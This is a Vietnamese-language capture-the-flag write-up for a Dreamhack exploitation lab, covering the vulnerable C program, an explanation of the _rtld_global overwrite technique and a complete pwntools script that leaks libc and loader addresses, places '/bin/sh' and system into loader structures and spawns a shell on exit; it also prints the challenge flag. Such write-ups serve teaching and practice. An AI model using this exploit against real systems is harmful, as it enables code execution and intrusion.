# Overwrite _rtld_global


tiếp tục 1 một chall về kĩ thuật **Overwrite _rtld_global**, tài liệu tham khảo:

**dreamhack:** https://learn.dreamhack.io/269#1

**Vì trong dreamhack đã có hướng dẫn rất kĩ rồi nên write up này mình chỉ phân tích hướng khai thác của dreamhack để solved chall này thôi**

## Source C:
```c 
// Name: ow_rtld.c
// Compile: gcc -o ow_rtld ow_rtld.c

#include <stdio.h>
#include <stdlib.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  long addr;
  long data;
  int idx;

  init();

  printf("stdout: %p\n", stdout);
  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("addr: ");
        scanf("%ld", &addr);
        printf("data: ");
        scanf("%ld", &data);
        *(long long *)addr = data;
        break;
      default:
        return 0;
    }
  }
  return 0;
}

```

**checks:**

![image](https://github.com/gookoosss/CTF/assets/128712571/efcc19ee-3f7b-4618-a4bb-75897909ed1c)


tại đây **Relro bật** rồi nên ta **ko thể khai thác bằng kĩ thuật tấn công .fini_array được**

như tên chall thì **ta sẽ tập chung vào kĩ thuật Overwrite _rtld_global**

## Khai thác

- **Stage 1:** *Calculating the _rtld_global address*

![image](https://github.com/gookoosss/CTF/assets/128712571/caed5569-b439-4a1d-b918-39a577a24ea1)


như dreamhack đã hướng dẫn thì ta cần leak ra những biến sau: 
- **_rtld_global**
- **_dl_load_lock**
- **_dl_rtld_lock_recursive**

![image](https://github.com/gookoosss/CTF/assets/128712571/56fd82f0-f9a5-4802-807b-2ce3dbc331c3)



từ địa chỉ stdout mà đề cho , **ta hoàn toàn leak được libc base, ld base từ đó tìm được địa chỉ của những thứ ta cần**

- **Stage 2:** *rtld_global structure manipulation exploit*

![image](https://github.com/gookoosss/CTF/assets/128712571/f521e51d-82cc-41df-8542-0cc001f754fa)


như trên hướng dẫn thì **ta sẽ gán /bin/sh\0 thành dạng u64() vào dl_load_lock và gán system vào _dl_rtld_lock_recursive**

giờ ta cùng phân tích lý do tại sao phải làm vậy

## phân tích

- như ta đã biết thì **khi kết thúc chương trình nó sẽ trỏ đến _rtld_global để thực thi exit**

![image](https://github.com/gookoosss/CTF/assets/128712571/cec6ee7d-ee0b-4db9-b5c1-be6b5eb40be3)


- như ảnh trên ta thấy thì **_dl_load_lock như 1 hàm để setup vậy cho lệnh exit vậy**, nên ta sẽ đoán là **ở đây ta có thể gán /bin/sh\0 vào** 
- sau khi setup xong thì **nó sẽ thực thi tại _dl_rtld_lock_recursive**, lúc này **ta gán hàm system vào đây** thì khi kết thức chương trình thì thay vì thực thi exit thì nó thực system cho mình 

cuối cùng ta kết thúc chương trình và lấy shell thôi:

![image](https://github.com/gookoosss/CTF/assets/128712571/8f7573c6-d5f1-47e8-86fa-aec04053b69b)


## script:

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./ow_rtld_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
# p = remote("host3.dreamhack.games", 20083)


context.binary = exe
p = process([exe.path])
gdb.attach(p, gdbscript = '''
b*main+96
b*main+240
c        
''')

input()

p.recvuntil('stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3ec760
ld.address = libc.address + 0x3f1000
rtld_global = ld.address + 0x228060
load_lock = rtld_global + 0x908
recursive = ld.address + 0x228f60
log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
log.info('ld base: ' + hex(ld.address))
log.info('rtld_global: ' + hex(rtld_global))
log.info('load_lock: ' + hex(load_lock))
log.info('recursive: ' + hex(recursive))

system = libc.sym['system']

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'addr: ', str(load_lock))
p.sendlineafter(b'data: ',str(u64('/bin/sh\0')))

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'addr: ', str(recursive))
p.sendlineafter(b'data: ',str(system))

p.sendlineafter(b'> ',b'2')

p.interactive()

# DH{a5bd416ee5f23da9f378c1b5d177b99366141f93beb3eabfa5b74abcf83f4293}

```

## Flag 

DH{a5bd416ee5f23da9f378c1b5d177b99366141f93beb3eabfa5b74abcf83f4293}

